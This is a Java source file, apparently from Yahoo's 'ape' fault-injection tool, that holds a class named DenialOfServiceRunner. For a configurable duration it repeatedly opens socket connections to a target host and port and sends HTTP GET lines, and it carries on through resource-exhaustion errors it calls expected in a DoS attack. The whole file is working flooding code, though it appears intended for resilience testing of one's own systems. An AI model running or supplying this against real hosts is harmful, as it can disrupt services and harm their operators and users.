/**
  * Copyright (c) 2012 Yahoo! Inc. All rights reserved.
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
  * You may obtain a copy of the License at
  *
  *   http://www.apache.org/licenses/LICENSE-2.0
  *
  * Unless required by applicable law or agreed to in writing, software
  * distributed under the License is distributed on an "AS IS" BASIS,
  * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  * See the License for the specific language governing permissions and
  * limitations under the License. See accompanying LICENSE file.
*/


package ape;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.net.ConnectException;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * This class runs a denial of service attack against a given host.  It does so by 
 * launching 4 threads that continuously bombard a given host and port with 
 * http requests.  Note that this doesn't work if you're bombarding a port that  
 * isn't listening for http requests.
 * 
 *
 */
public class DenialOfServiceRunner extends Socket implements Runnable 
{
	private String target;
	private int port;
	private int duration;
	


	public void run()
	{
		long currentTime = System.currentTimeMillis();
		long endTime = currentTime + (duration * 1000);
		while(System.currentTimeMillis() < endTime)
		{
			try {
				Socket net = new Socket(target, port);
				sendRawLine("GET / HTTP/1.1", net);
			}
			catch(UnknownHostException e)
			{
				System.out.println("Could not resolve hostname.");
				e.printStackTrace();
				Main.logger.info("Could not resolve hostname.");
				Main.logger.info(e);
				break;
			}
			catch(ConnectException e)
			{
				System.out.println("The connection was refused.  Make sure that port " + port + " is open and receiving connections on host " + target);
				Main.logger.info("The connection was refused.  Make sure that port " + port + " is open and receiving connections on host " + target);
				e.printStackTrace();
				Main.logger.info(e);
				break;
			}
			catch(SocketException e)
			{
				if(Main.VERBOSE)
				{
					System.out.println("VERBOSE: Client says too many files open. This is expected in a DoS attack. Continuing...");
					e.printStackTrace();
				}
			}
			catch(IOException e)
			{
				e.printStackTrace();
				Main.logger.info(e);
				break;
			}
		}
	}
	
	public static void sendRawLine(String text, Socket sock)
	{
		try {
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(sock.getOutputStream()));
			out.write(text);
			out.flush();
		}
		catch(IOException e)
		{
			e.printStackTrace();
		}
	}
	
	public DenialOfServiceRunner(String theTarget, String thePort, String theDuration)
	{
		target = theTarget;
		port = Integer.parseInt(thePort);
		duration = Integer.parseInt(theDuration);
	}
	
	public String getTarget() {
		return target;
	}

	public void setTarget(String target) {
		this.target = target;
	}
	
	public int getPort() {
		return port;
	}

	public void setPort(int port) {
		this.port = port;
	}
}
